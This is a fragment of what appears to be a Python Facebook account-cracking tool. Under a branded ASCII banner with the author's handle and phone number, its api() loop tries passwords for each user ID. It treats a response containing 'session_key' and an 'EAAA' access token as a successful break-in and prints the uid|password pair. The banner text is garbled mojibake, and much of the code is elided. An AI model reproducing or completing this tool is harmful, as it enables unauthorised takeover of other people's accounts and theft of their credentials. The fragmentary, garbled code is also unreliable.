...
`MM(      )M'                                                   `MMMMMMMb.  
 `MM.     d'                              /                      MM    `Mb  
  `MM.   d'    ____      ___   ___  __   /M      _____           MM     MM  
   `MM. d'    6MMMMb\  6MMMMb  `MM 6MMb /MMMMM  6MMMMMb          MM     MM  
    `MMd     MM'    ` 8M'  `Mb  MMM9 `Mb MM    6M'   `Mb         MM    .M9  
     dMM.    YM.          ,oMM  MM'   MM MM    MM     MM         MMMMMMM9'  
    d'`MM.    YMMMMb  ,6MM9'MM  MM    MM MM    MM     MM MMMMMMM MM  \M\    
   d'  `MM.       `Mb MM'   MM  MM    MM MM    MM     MM         MM   \M\   
  d'    `MM. L    ,MM MM.  ,MM  MM    MM YM.  ,YM.   ,M9         MM    \M\  
_M(_    _)MM_MYMMMM9  `YMMM9'Yb_MM_  _MM_ YMMM9 YMMMMM9         _MM_    \M\_
                                                                            
                                                                                      
    鈹屸攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹�
    鈹� [鉁揮 AUTHOR   : Xsanto-R            鈹�
    鈹� [鉁揮 GITHUB   : Linux-Xsanto        鈹�
    鈹� [鉁揮 WHATSAPP : 01616885070        鈹�
    鈹� [鉁揮 POWER BY : \x1b[1;32mXsanto\x1b[1;97m            鈹�
    鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹榎033[1;92m""")
		...
		print("\033[92;1m        AUTHOR : Xsanto-R      ")
		print("\033[97;1m   鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€")
...
(https://www.facebook.com/profile.php?id=100072982531662)
		else:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[Xsanto馃う鈥嶁檪锔廬 : \033[0;97m %s/%s -> \033[0;92m [OK馃槏:%s ]- \033[0;93m[CP馃樋:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[Xsanto-OK馃槏] %s|%s\033[0;97m         "%(uid, pw))
